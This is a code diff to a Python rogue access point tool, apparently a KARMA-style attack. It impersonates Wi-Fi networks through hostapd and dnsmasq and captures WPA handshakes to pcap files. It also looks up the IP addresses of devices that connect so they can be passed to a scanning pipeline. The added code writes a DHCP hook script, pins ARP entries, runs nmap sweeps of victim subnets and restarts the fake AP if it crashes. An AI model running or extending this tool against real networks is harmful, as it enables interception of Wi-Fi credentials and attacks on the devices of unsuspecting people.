@@ -289,10 +289,19 @@ class Hostapd:
 
 	def change_network_settings(self, network):
 		self.network = IPNetwork(network)
-		DEBUG("ifconfig {iface} {network}".format(iface=self.iface, network=network))
-		os.system("ifconfig {iface} {network}".format(iface=self.iface, network=network))
-		os.system("ip r add {network} dev {iface} table 1033".format(iface=self.iface, network=str(self.network.cidr)))
-		os.system("ip rule add to {network} lookup 1033".format(iface=self.iface, network=str(self.network.cidr)))
+		ip_cidr = str(self.network.cidr).replace(str(self.network.network), str(self.network[1]))
+		# Flush existing addresses and set new one — use both ip and ifconfig for compatibility
+		os.system("ip addr flush dev {iface} 2>/dev/null".format(iface=self.iface))
+		ret = os.system("ip addr add {ip_cidr} dev {iface} 2>/dev/null".format(ip_cidr=ip_cidr, iface=self.iface))
+		if ret != 0:
+			os.system("ifconfig {iface} {ip} netmask {mask} 2>/dev/null".format(
+				iface=self.iface,
+				ip=str(self.network[1]),
+				mask=str(self.network.netmask)))
+		os.system("ip link set {iface} up 2>/dev/null".format(iface=self.iface))
+		os.system("ip r add {network} dev {iface} table 1033 2>/dev/null".format(iface=self.iface, network=str(self.network.cidr)))
+		os.system("ip rule add to {network} lookup 1033 2>/dev/null".format(iface=self.iface, network=str(self.network.cidr)))
+		print(f"  [NET] {self.iface} → {ip_cidr}")
 
 
 class Hostapd_OPN(Hostapd):
@@ -419,10 +428,14 @@ own_ip_addr=127.0.0.1
 				CRIT("[{hostapd}] {line}".format(hostapd=self.name, line=line.split('\n')[0]))
 
 class DHCPD:
-	file = "/tmp/dhcp_{iface}.conf"
+	file       = "/tmp/dhcp_{iface}.conf"
+	lease_file = "/tmp/dhcp_{iface}.leases"
+	hook_file  = "/tmp/karma_dhcp_hook.sh"
 	config = '''domain=fake.net
 interface={iface}
-dhcp-range={ip_start},{ip_end},2m
+dhcp-range={ip_start},{ip_end},5m
+dhcp-leasefile={lease_file}
+dhcp-script={hook_file}
 dhcp-option=1,{mask}
 dhcp-option=3,{ip_gw}
 dhcp-option=6,8.8.8.8,8.8.4.4
@@ -432,16 +445,45 @@ dhcp-option=249,0.0.0.0/1,{ip_gw},128.0.0.0/1,{ip_gw}
 	def __init__(self, iface, network):
 		self.iface = iface
 		net = IPNetwork(network)
-		self.ip_start = str(net[2])
-		self.ip_end = str(net[200])
-		self.mask = str(net.netmask)
-		self.ip_gw = str(net[1])
-		self.is_up = False
+		self.ip_start  = str(net[2])
+		self.ip_end    = str(net[200])
+		self.mask      = str(net.netmask)
+		self.ip_gw     = str(net[1])
+		self.is_up     = False
 		self.is_shutdown = False
-		self.clients = {}
-		self.file = self.file.format(iface=iface)
+		self.clients   = {}
+		self.file       = self.file.format(iface=iface)
+		self.lease_file = self.lease_file.format(iface=iface)
+		# Write dhcp-script hook that fires immediately on IP assignment
+		karma_out = os.environ.get('KARMA_OUT', '/tmp')
+		hook_script = f"""#!/bin/bash
+# Called by dnsmasq: add|del|old <mac> <ip> [hostname]
+ACTION="$1"; MAC="$2"; IP="$3"
+IFACE="{self.iface}"
+OUT="{karma_out}"
+DBG="$OUT/karma_debug.log"
+ts=$(date +'%H:%M:%S')
+echo "[$ts] [DHCP-HOOK] action=$ACTION mac=$MAC ip=$IP" >> "$DBG"
+[[ "$ACTION" == "add" || "$ACTION" == "old" ]] || exit 0
+[[ -z "$IP" ]] && exit 0
+# Write for Dart pipeline trigger
+grep -qxF "$IP" "$OUT/karma_clients.txt" 2>/dev/null || echo "$IP" >> "$OUT/karma_clients.txt"
+# Write ip:mac mapping for karma.py poll
+echo "$IP $MAC" >> "$OUT/karma_dhcp.txt"
+# Pin permanent ARP entry so route stays alive during pipeline scans
+ip neigh replace "$IP" lladdr "$MAC" dev "$IFACE" nud permanent 2>/dev/null \
+  && echo "[$ts] [DHCP-HOOK] ARP pinned $IP -> $MAC on $IFACE" >> "$DBG" \
+  || echo "[$ts] [DHCP-HOOK] ARP pin failed for $IP" >> "$DBG"
+echo "[$ts] [DHCP-HOOK] wrote $IP to karma_clients.txt + karma_dhcp.txt" >> "$DBG"
+"""
+		with open(self.hook_file, "w") as f:
+			f.write(hook_script)
+		os.system(f"chmod +x {self.hook_file}")
 		with open(self.file, "w") as f:
-			f.write(self.config.format(iface=self.iface, ip_start=self.ip_start, ip_end=self.ip_end, mask=self.mask, ip_gw=self.ip_gw))
+			f.write(self.config.format(
+				iface=self.iface, ip_start=self.ip_start, ip_end=self.ip_end,
+				mask=self.mask, ip_gw=self.ip_gw,
+				lease_file=self.lease_file, hook_file=self.hook_file))
 		self.dhcpd = subprocess.Popen(["dnsmasq", "--conf-file="+self.file, "-d", "-p0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 	def stop(self):
 		self.is_shutdown = True
@@ -610,12 +652,21 @@ def start_AP_WPA(iface, essid):
 	hostapd_wpa = try_to_start_hostapd(Hostapd_WPA, iface, essid, args.psk or password, max_attempts=5)
 	if hostapd_wpa.is_up:
 		if args.psk or password:
+			_dbg(f"[NET] setting {iface} → 12.0.0.1/24")
 			hostapd_wpa.change_network_settings("12.0.0.1/24")
+			_dbg(f"[DHCP] starting dnsmasq on {iface} range 12.0.0.2-200")
 			hostapd_wpa.dhcpd = DHCPD(iface, "12.0.0.1/24")
+			_dbg(f"[DHCP] lease file → {hostapd_wpa.dhcpd.lease_file}")
 		INFO("run WPA network \"{essid}\" \"{password}\" ({num})".format(num=pcap_no, essid=essid, password=args.psk or password))
 		on_network(essid, iface)
 		m1 = False
 		m2 = False
+		# Reset per-session state
+		global _arping_done, _mac_first_seen, _arp_incomplete_probed, _alt_subnets_added
+		_arping_done.clear()
+		_mac_first_seen.clear()
+		_arp_incomplete_probed.clear()
+		_alt_subnets_added = False
 		begin = time()
 		while time() - begin < TIMEOUT and not is_exit:
 			try:
@@ -632,25 +683,136 @@ def start_AP_WPA(iface, essid):
 						WARN("handshake: %d EAPOL packets (M1/M2)" % len(handshakes))
 						break
 				else:
+					# ── Watchdog: recover from hostapd crash or USB adapter reset ──────
+					_hostapd_dead  = hostapd_wpa.hostapd.poll() is not None
+					_iface_missing = not os.path.exists(f'/sys/class/net/{iface}')
+					if (_hostapd_dead or _iface_missing) and not hostapd_wpa.is_shutdown:
+						_dbg(f"[WATCHDOG] {'hostapd exited' if _hostapd_dead else 'interface gone'} — starting recovery")
+						# Stop DHCP cleanly
+						if hostapd_wpa.dhcpd:
+							try: hostapd_wpa.dhcpd.stop()
+							except Exception: pass
+						hostapd_wpa.is_shutdown = True
+						# Wait up to 30s for USB adapter to reappear after reset
+						_iface_ok = os.path.exists(f'/sys/class/net/{iface}')
+						if not _iface_ok:
+							for _w in range(30):
+								sleep(1)
+								if os.path.exists(f'/sys/class/net/{iface}'):
+									_iface_ok = True
+									_dbg(f"[WATCHDOG] {iface} reappeared after {_w+1}s")
+									break
+								_dbg(f"[WATCHDOG] waiting for {iface}... {_w+1}s")
+						if not _iface_ok:
+							_dbg(f"[WATCHDOG] {iface} never came back — aborting")
+							break
+						# Re-initialize interface into clean managed state
+						os.system(f"ip link set {iface} down 2>/dev/null")
+						sleep(0.5)
+						os.system(f"iw dev {iface} set type managed 2>/dev/null")
+						sleep(0.5)
+						os.system(f"ip link set {iface} up 2>/dev/null")
+						sleep(2)
+						# Restart hostapd
+						_dbg(f"[WATCHDOG] restarting hostapd...")
+						hostapd_wpa = try_to_start_hostapd(
+							Hostapd_WPA, iface, essid, args.psk or password, max_attempts=3)
+						if not hostapd_wpa.is_up:
+							_dbg(f"[WATCHDOG] hostapd restart failed — retrying next cycle")
+							sleep(3)
+							continue
+						# Restore IP + DHCP
+						_dbg(f"[WATCHDOG] restoring network + dnsmasq")
+						hostapd_wpa.change_network_settings("12.0.0.1/24")
+						hostapd_wpa.dhcpd = DHCPD(iface, "12.0.0.1/24")
+						# Reset MAC timers so recovered clients don't instantly hit GIVEUP
+						_mac_first_seen.clear()
+						_arping_done.clear()
+						_arp_incomplete_probed.clear()
+						_dbg(f"[WATCHDOG] AP recovered — MAC timers reset, resuming client poll")
+
 					# Poll connected stations — no scapy on AP interface (would kill hostapd)
 					sleep(0.5 if args.ac_essid else 1)
-					for mac in list(hostapd_wpa.clients):
-						if mac in known_targets:
-							continue
-						ip = _arp_lookup(mac, iface)
+					ip_gw   = hostapd_wpa.dhcpd.ip_gw if hostapd_wpa.dhcpd else str(IPNetwork("12.0.0.1/24")[1])
+					subnet  = str(hostapd_wpa.network.cidr) if hostapd_wpa.network else "12.0.0.0/24"
+
+					# Step 1: probe any INCOMPLETE ARP entries to force MAC resolution
+					_probe_incomplete_arps(iface)
+
+					# Step 2: ARP cross-ref — find pending MACs that appear in complete ARP table
+					pending_macs = [m for m in hostapd_wpa.clients if m not in known_targets]
+					for arp_ip, arp_mac in _arp_complete_entries(iface).items():
+						if arp_mac in pending_macs and arp_ip != ip_gw:
+							vendor = lookup(arp_mac)
+							NOTICE(Fore.GREEN + f"[AC] {arp_mac} ({vendor})  IP {arp_ip}  GW {ip_gw}" + Fore.RESET)
+							_dbg(f"[ARP-XREF] {arp_mac} → {arp_ip} (complete ARP cross-ref)")
+							_pin_arp(arp_ip, arp_mac, iface)
+							known_targets.add(arp_mac)
+							on_client(arp_ip, arp_mac, ip_gw)
+
+					# Step 3: per-MAC poll (dhcp hook → lease → ARP → ip neigh → nmap → fallback)
+					pending_macs = [m for m in hostapd_wpa.clients if m not in known_targets]
+					for mac in pending_macs:
+						if mac not in _mac_first_seen:
+							_mac_first_seen[mac] = time()
+							_dbg(f"[NEW] {mac} — first seen, awaiting DHCP hook or ARP")
+
+						waited = time() - _mac_first_seen[mac]
+						do_verbose = (waited < 2) or (int(waited) % 10 == 0)
+						ip = _arp_lookup(mac, iface, verbose=do_verbose)
+
+						# After 4s with no IP — active nmap of AP subnet (once per MAC)
+						if not ip and mac not in _arping_done and waited > 4:
+							_arping_done.add(mac)
+							_dbg(f"[SCAN] {mac} — {waited:.0f}s no IP, nmap -sn {subnet}")
+							subprocess.Popen(f"nmap -sn -n {subnet} >/dev/null 2>&1", shell=True)
+							sleep(2)
+							ip = _arp_lookup(mac, iface, verbose=True)
+
+						# After 12s still no IP — client may have out-of-subnet static IP
+						# Add common IoT static subnet aliases and scan those ranges
+						if not ip and not _alt_subnets_added and waited > 12:
+							_alt_subnets_added = True
+							_dbg(f"[FALLBACK] {mac} — {waited:.0f}s no IP, adding static subnet aliases")
+							for alias_net in ["192.168.0.1/24", "192.168.1.1/24", "10.0.0.1/24"]:
+								os.system(f"ip addr add {alias_net} dev {iface} 2>/dev/null")
+							sleep(1)
+							subprocess.Popen(
+								f"nmap -sn -n 192.168.0.0/24 192.168.1.0/24 10.0.0.0/24 >/dev/null 2>&1",
+								shell=True)
+							_dbg(f"[FALLBACK] scanning 192.168.0/24, 192.168.1/24, 10.0.0/24")
+							sleep(3)
+							ip = _arp_lookup(mac, iface, verbose=True)
+
 						if not ip:
+							# Give up after 60s — add to known_targets to stop polling
+							if waited > 60:
+								_dbg(f"[GIVEUP] {mac} — {waited:.0f}s no IP, giving up")
+								known_targets.add(mac)
+								continue
+							if do_verbose: _dbg(f"[WAIT] {mac} — {waited:.0f}s elapsed, no IP")
 							continue
-						ip_gw = hostapd_wpa.dhcpd.ip_gw if hostapd_wpa.dhcpd else str(IPNetwork("12.0.0.1/24")[1])
+						if ip == ip_gw:
+							_dbg(f"[SKIP] {mac} → {ip} is gateway — ignoring")
+							continue
 						vendor = lookup(mac)
 						NOTICE(Fore.GREEN + f"[AC] {mac} ({vendor})  IP {ip}  GW {ip_gw}" + Fore.RESET)
+						_dbg(f"[FOUND] {mac} → {ip}")
+						# Pin ARP entry permanently so kernel won't lose route while pipeline scans
+						_pin_arp(ip, mac, iface)
 						known_targets.add(mac)
 						on_client(ip, mac, ip_gw)
 			except Exception as e:
 				print(str(e))
-				break
+				continue
 		if hostapd_wpa.dhcpd:
 			hostapd_wpa.dhcpd.stop()
 		hostapd_wpa.shutdown()
+		# Clean up fallback subnet aliases if we added them
+		if _alt_subnets_added:
+			for alias_net in ["192.168.0.1/24", "192.168.1.1/24", "10.0.0.1/24"]:
+				os.system(f"ip addr del {alias_net} dev {iface} 2>/dev/null")
+			_alt_subnets_added = False
 		if handshakes and not password:
 			handshakes.append(get_beacon(essid))
 			pcap = save(handshakes, network_name=os.path.join("handshakes", essid))
@@ -779,23 +941,142 @@ def parse_raw_80211(p):
 				Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
 			known_essids.add(essid)'''
 				
-known_targets = set()
-client_pids       = {}   # mac → [Popen, ...] — on_client procs spawned per client
-client_mac_to_ip  = {}   # mac → ip           — needed to clear OPN IP-based known_targets
+known_targets          = set()
+_arping_done           = set()    # MACs we've already active-scanned — avoid repeating
+_mac_first_seen        = {}       # mac → time.time() — track how long we've waited
+_arp_incomplete_probed = set()    # IPs already probed via nmap due to INCOMPLETE ARP entry
+_alt_subnets_added     = False    # whether we've added out-of-subnet aliases this session
+client_pids       = {}       # mac → [Popen, ...] — on_client procs spawned per client
+client_mac_to_ip  = {}       # mac → ip — needed to clear OPN IP-based known_targets
 
-def _arp_lookup(mac: str, iface: str) -> str:
-	"""Return the IP address for a MAC from /proc/net/arp, or empty string."""
+_DBG_LOG = os.path.join(os.environ.get('KARMA_OUT', '/tmp'), 'karma_debug.log')
+def _dbg(msg: str):
+	try:
+		with open(_DBG_LOG, 'a') as _f:
+			from datetime import datetime as _dt
+			_f.write(f"[{_dt.now().strftime('%H:%M:%S')}] {msg}\n")
+	except Exception:
+		pass
+
+def _arp_lookup(mac: str, iface: str, verbose: bool = True) -> str:
+	"""Return the IP for a MAC. Priority: dhcp-hook file → lease file → ARP → ip neigh."""
+	mac_l = mac.lower()
+	karma_out = os.environ.get('KARMA_OUT', '/tmp')
+
+	# 0. dhcp-hook output — written by dnsmasq dhcp-script callback (most reliable)
+	dhcp_txt = os.path.join(karma_out, 'karma_dhcp.txt')
+	try:
+		with open(dhcp_txt) as f:
+			for line in f:
+				parts = line.strip().split()
+				if len(parts) >= 2 and parts[1].lower() == mac_l:
+					ip = parts[0]
+					if ip and ip != "0.0.0.0":
+						if verbose: _dbg(f"[IP-FOUND] {mac} → {ip} (dhcp-hook)")
+						return ip
+	except FileNotFoundError:
+		if verbose: _dbg(f"[HOOK] {dhcp_txt} not found yet")
+	except Exception as e:
+		if verbose: _dbg(f"[HOOK] error: {e}")
+
+	# 1. dnsmasq lease file  (format: <expiry> <mac> <ip> <hostname> <clientid>)
+	lease_path = "/tmp/dhcp_{iface}.leases".format(iface=iface)
+	try:
+		with open(lease_path) as f:
+			content = f.read().strip()
+			if verbose: _dbg(f"[LEASE] {lease_path}: {repr(content) if content else 'EMPTY'}")
+			for line in content.splitlines():
+				parts = line.split()
+				if len(parts) >= 3 and parts[1].lower() == mac_l:
+					ip = parts[2]
+					if ip and ip != "0.0.0.0":
+						if verbose: _dbg(f"[IP-FOUND] {mac} → {ip} (lease file)")
+						return ip
+	except FileNotFoundError:
+		if verbose: _dbg(f"[LEASE] {lease_path} — NOT FOUND")
+	except Exception as e:
+		if verbose: _dbg(f"[LEASE] error: {e}")
+
+	# 2. kernel ARP table
+	try:
+		with open("/proc/net/arp") as f:
+			arp_lines = [l.strip() for l in f.readlines() if iface in l]
+			if verbose: _dbg(f"[ARP] wlan1 entries: {arp_lines}")
+			for line in arp_lines:
+				parts = line.split()
+				if len(parts) >= 6 and parts[3].lower() == mac_l:
+					ip = parts[0]
+					if ip != "0.0.0.0":
+						if verbose: _dbg(f"[IP-FOUND] {mac} → {ip} (ARP table)")
+						return ip
+	except Exception as e:
+		if verbose: _dbg(f"[ARP] error: {e}")
+		pass
+
+	# 3. ip neigh (catches entries on any interface — useful when AP uses bridge)
+	try:
+		out = subprocess.check_output(["ip", "neigh", "show", "dev", iface],
+		                              stderr=subprocess.DEVNULL).decode().strip()
+		if verbose: _dbg(f"[NEIGH] ip neigh dev {iface}: {repr(out) if out else 'EMPTY'}")
+		for line in out.splitlines():
+			parts = line.split()
+			if len(parts) >= 5 and parts[4].lower() == mac_l:
+				ip = parts[0]
+				if ip and ip != "0.0.0.0":
+					if verbose: _dbg(f"[IP-FOUND] {mac} → {ip} (ip neigh)")
+					return ip
+	except Exception as e:
+		if verbose: _dbg(f"[NEIGH] error: {e}")
+
+	if verbose: _dbg(f"[IP-MISS] {mac} — all sources exhausted, no IP found")
+	return ""
+
+	return ""
+
+def _arp_complete_entries(iface: str) -> dict:
+	"""Return {ip: mac_lower} for all COMPLETE ARP entries on iface."""
+	result = {}
 	try:
 		with open("/proc/net/arp") as f:
 			for line in f:
+				if iface not in line:
+					continue
 				parts = line.split()
-				if len(parts) >= 6 and parts[3].lower() == mac.lower() and parts[5] == iface:
-					ip = parts[0]
-					if ip != "0.0.0.0":
-						return ip
+				if len(parts) < 6:
+					continue
+				ip, _, flags, mac, _, _ = parts[:6]
+				if mac != "00:00:00:00:00:00" and flags != "0x0":
+					result[ip] = mac.lower()
 	except Exception:
 		pass
-	return ""
+	return result
+
+def _pin_arp(ip: str, mac: str, iface: str):
+	"""Add permanent static ARP entry so kernel never loses the route to the client."""
+	ret = os.system(f"ip neigh replace {ip} lladdr {mac} dev {iface} nud permanent 2>/dev/null")
+	if ret == 0:
+		_dbg(f"[ARP-PIN] {ip} → {mac} pinned permanent on {iface}")
+	else:
+		_dbg(f"[ARP-PIN] {ip} → {mac} pin failed (ret={ret})")
+
+def _probe_incomplete_arps(iface: str):
+	"""nmap any new INCOMPLETE ARP entry to force MAC resolution quickly."""
+	global _arp_incomplete_probed
+	try:
+		with open("/proc/net/arp") as f:
+			for line in f:
+				if iface not in line:
+					continue
+				parts = line.split()
+				if len(parts) < 6:
+					continue
+				ip, _, _, mac, _, _ = parts[:6]
+				if mac == "00:00:00:00:00:00" and ip not in _arp_incomplete_probed:
+					_arp_incomplete_probed.add(ip)
+					_dbg(f"[ARP-INCOMPLETE] {ip} detected, probing to resolve MAC")
+					subprocess.Popen(f"nmap -sn -n {ip} >/dev/null 2>&1", shell=True)
+	except Exception:
+		pass
 
 def _drop_client(mac):
 	"""Kill on_client scripts for a client that lost connection and free its known_targets
